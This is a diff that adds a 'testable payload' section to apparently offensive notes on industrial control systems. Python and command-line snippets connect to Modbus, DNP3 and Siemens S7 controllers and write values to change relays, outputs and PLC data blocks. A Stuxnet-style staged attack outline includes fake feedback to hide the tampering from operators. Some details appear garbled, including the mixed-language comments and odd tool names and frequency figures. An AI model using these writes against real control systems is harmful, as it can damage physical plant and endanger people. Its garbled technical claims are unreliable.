@@ -115,3 +115,74 @@ Stealth:
 - Stuxnet Analysis — https://www.welivesecurity.com/2011/01/17/...
 - Modbus Protocol — https://modbus.org/
 - SANS ICS — https://www.sans.org/ics/
+
+## Konkret — ICS/SCADA Payload (Testable)
+
+### Modbus TCP (Port 502, No Auth)
+
+```bash
+# Install modbus client
+pip install pyModbusTCP
+
+# Read holding register (coil/input)
+python3 -c "
+from pyModbusTCP.client import ModbusClient
+c = ModbusClient(host='target', port=502)
+c.open()
+# Read 10 holding register dari address 0
+regs = c.read_holding_registers(0, 10)
+print(regs)
+# Write register 0 = 1 (modify relay/status)
+c.write_single_register(0, 1)
+c.close()
+"
+
+# ModbusScan / mbtget (CLI tools)
+mbtget -a 1 -r 0 -c 10 target_ip
+```
+
+### DNP3 (Port 20000, No Auth)
+
+```bash
+# DNP3是没有 authentication di banyak instalasi legacy
+# FraiseYu (Nmap NSE):
+nmap -p 20000 --script dnp3-enumerate target
+# Output: outstation address, point index, values
+
+# DNP3 write (modify analog output):
+python3 dnp3_client.py --target target --write --index 0 --value 100
+```
+
+### S7comm (Siemens, Port 102)
+
+```bash
+# Snap7 / s7comm-level attack
+nmap -p 102 --script s7-info target   # enumerate PLC
+# Output: module, firmware, serial
+
+# Python-snap7:
+import snap7
+plc = snap7.client.Client()
+plc.connect('target', 0, 1)
+# Read DB (data block)
+data = plc.db_read(1, 0, 10)  # read DB1, offset 0, size 10
+# Write DB → modify PLC logic!
+plc.db_write(1, 0, b'\x01\x00\x00\x00')
+```
+
+### Stuxnet Cascade Pattern
+
+```
+1. Infeksi USB drive (LNK file + DLL)        [stage 0]
+2. Masuk PLC Step 7 project machine         [stage 1]
+3. Cari target S7-315/415 PLC               [stage 2]
+4. Modify code block OB35 (417 logic mod)   [stage 3]
+   → Frequency controller rot valve bypass
+   → 1410Hz (safe) → 2Hz (centrifuge rusak)
+5. Send fake feedback (0x0001) → operator tidak aware
+6. Duplicate di 5 facility → multi-site outbreak
+```
+---
+
+audited
+---
